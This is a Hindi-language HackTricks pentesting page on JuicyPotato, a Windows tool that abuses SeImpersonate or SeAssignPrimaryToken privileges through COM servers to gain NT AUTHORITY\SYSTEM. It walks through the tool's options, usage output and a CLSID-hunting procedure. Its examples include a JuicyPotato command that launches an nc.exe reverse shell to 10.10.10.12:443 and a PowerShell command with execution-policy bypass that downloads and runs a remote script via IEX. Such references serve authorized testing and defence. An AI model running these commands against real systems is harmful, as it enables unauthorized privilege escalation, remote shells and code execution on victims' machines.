# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato Windows Server 2019 और Windows 10 build 1809 के बाद काम नहीं करता है। हालांकि, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) का उपयोग **समान विशेषाधिकारों का लाभ उठाने और `NT AUTHORITY\SYSTEM`** स्तर की पहुंच प्राप्त करने के लिए किया जा सकता है। _**जांचें:**_

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (सुनहरे विशेषाधिकारों का दुरुपयोग) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_एक मीठा संस्करण_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, थोड़ा जूस के साथ, यानी **एक और स्थानीय विशेषाधिकार वृद्धि उपकरण, Windows सेवा खातों से NT AUTHORITY\SYSTEM**_

#### आप juicypotato को [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts) से डाउनलोड कर सकते हैं

### सारांश <a href="#summary" id="summary"></a>

[**juicy-potato Readme से**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) और इसके [वेरिएंट्स](https://github.com/decoder-it/lonelypotato) विशेषाधिकार वृद्धि श्रृंखला का लाभ उठाते हैं जो [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [सेवा](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) पर आधारित है जिसमें `127.0.0.1:6666` पर MiTM श्रोता है और जब आपके पास `SeImpersonate` या `SeAssignPrimaryToken` विशेषाधिकार होते हैं। एक Windows बिल्ड समीक्षा के दौरान, हमने एक सेटअप पाया जहां `BITS` जानबूझकर बंद था और पोर्ट `6666` लिया गया था।

हमने [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) को हथियार बनाने का निर्णय लिया: **Juicy Potato को नमस्ते कहें**।

> सिद्धांत के लिए, देखें [Rotten Potato - सेवा खातों से SYSTEM तक विशेषाधिकार वृद्धि](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) और लिंक और संदर्भों की श्रृंखला का पालन करें।

हमने खोजा कि, `BITS` के अलावा, कई COM सर्वर हैं जिनका हम दुरुपयोग कर सकते हैं। उन्हें बस यह करना है:

1. वर्तमान उपयोगकर्ता द्वारा इंस्टेंटिएबल होना चाहिए, सामान्यतः एक "सेवा उपयोगकर्ता" जिसके पास अनुकरण विशेषाधिकार होते हैं
2. `IMarshal` इंटरफेस को लागू करना चाहिए
3. एक ऊंचे उपयोगकर्ता (SYSTEM, Administrator, …) के रूप में चलाना चाहिए

कुछ परीक्षणों के बाद, हमने कई Windows संस्करणों पर [दिलचस्प CLSID की एक विस्तृत सूची प्राप्त की और परीक्षण किया](http://ohpe.it/juicy-potato/CLSID/)।

### जूस के विवरण <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato आपको अनुमति देता है:

- **लक्ष्य CLSID** _कोई भी CLSID चुनें जो आप चाहते हैं। [_यहाँ_](http://ohpe.it/juicy-potato/CLSID/) _आप OS द्वारा व्यवस्थित सूची पा सकते हैं।_
- **COM सुनने वाला पोर्ट** _आप पसंद का COM सुनने वाला पोर्ट परिभाषित करें (हार्डकोडेड 6666 के बजाय)_
- **COM सुनने वाला IP पता** _किसी भी IP पर सर्वर को बाइंड करें_
- **प्रक्रिया निर्माण मोड** _अनुकरण किए गए उपयोगकर्ता के विशेषाधिकार के आधार पर आप चुन सकते हैं:_
- `CreateProcessWithToken` (को `SeImpersonate` की आवश्यकता है)
- `CreateProcessAsUser` (को `SeAssignPrimaryToken` की आवश्यकता है)
- `दोनों`
- **लॉन्च करने के लिए प्रक्रिया** _यदि शोषण सफल होता है तो एक निष्पादन योग्य या स्क्रिप्ट लॉन्च करें_
- **प्रक्रिया तर्क** _लॉन्च की गई प्रक्रिया के तर्कों को अनुकूलित करें_
- **RPC सर्वर पता** _एक छिपे हुए दृष्टिकोण के लिए आप एक बाहरी RPC सर्वर पर प्रमाणित कर सकते हैं_
- **RPC सर्वर पोर्ट** _यदि आप एक बाहरी सर्वर पर प्रमाणित करना चाहते हैं और फ़ायरवॉल पोर्ट `135` को ब्लॉक कर रहा है तो उपयोगी है…_
- **परीक्षण मोड** _मुख्य रूप से परीक्षण उद्देश्यों के लिए, यानी CLSIDs का परीक्षण करना। यह DCOM बनाता है और टोकन के उपयोगकर्ता को प्रिंट करता है। परीक्षण के लिए_ [_यहाँ देखें_](http://ohpe.it/juicy-potato/Test/)

### उपयोग <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### अंतिम विचार <a href="#final-thoughts" id="final-thoughts"></a>

[**जुसी-पोटैटो Readme से**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

यदि उपयोगकर्ता के पास `SeImpersonate` या `SeAssignPrimaryToken` विशेषाधिकार हैं तो आप **SYSTEM** हैं।

इन सभी COM सर्वरों के दुरुपयोग को रोकना लगभग असंभव है। आप `DCOMCNFG` के माध्यम से इन वस्तुओं के अनुमतियों को संशोधित करने के बारे में सोच सकते हैं लेकिन शुभकामनाएँ, यह चुनौतीपूर्ण होने वाला है।

वास्तविक समाधान संवेदनशील खातों और अनुप्रयोगों की सुरक्षा करना है जो `* SERVICE` खातों के तहत चलते हैं। `DCOM` को रोकना निश्चित रूप से इस शोषण को रोक देगा लेकिन इससे अंतर्निहित OS पर गंभीर प्रभाव पड़ सकता है।

से: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## उदाहरण

नोट: कोशिश करने के लिए CLSIDs की सूची के लिए [इस पृष्ठ](https://ohpe.it/juicy-potato/CLSID/) पर जाएं।

### एक nc.exe रिवर्स शेल प्राप्त करें
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### पॉवरशेल रिव
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### एक नया CMD लॉन्च करें (यदि आपके पास RDP एक्सेस है)

![](<../../images/image (300).png>)

## CLSID समस्याएँ

अक्सर, JuicyPotato द्वारा उपयोग किया जाने वाला डिफ़ॉल्ट CLSID **काम नहीं करता** और एक्सप्लॉइट विफल हो जाता है। आमतौर पर, एक **काम करने वाला CLSID** खोजने के लिए कई प्रयासों की आवश्यकता होती है। एक विशिष्ट ऑपरेटिंग सिस्टम के लिए प्रयास करने के लिए CLSIDs की सूची प्राप्त करने के लिए, आपको इस पृष्ठ पर जाना चाहिए:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **CLSID की जांच करना**

पहले, आपको juicypotato.exe के अलावा कुछ निष्पादन योग्य फ़ाइलों की आवश्यकता होगी।

[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) डाउनलोड करें और इसे अपने PS सत्र में लोड करें, और [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) डाउनलोड करें और निष्पादित करें। यह स्क्रिप्ट परीक्षण के लिए संभावित CLSIDs की एक सूची बनाएगी।

फिर [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat) डाउनलोड करें (CLSID सूची और juicypotato निष्पादन योग्य के लिए पथ बदलें) और इसे निष्पादित करें। यह हर CLSID को आजमाना शुरू कर देगा, और **जब पोर्ट नंबर बदलता है, तो इसका मतलब होगा कि CLSID काम कर गया**।

**काम करने वाले CLSIDs की जांच करें** **पैरामीटर -c का उपयोग करके**

## संदर्भ

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

{{#include ../../banners/hacktricks-training.md}}
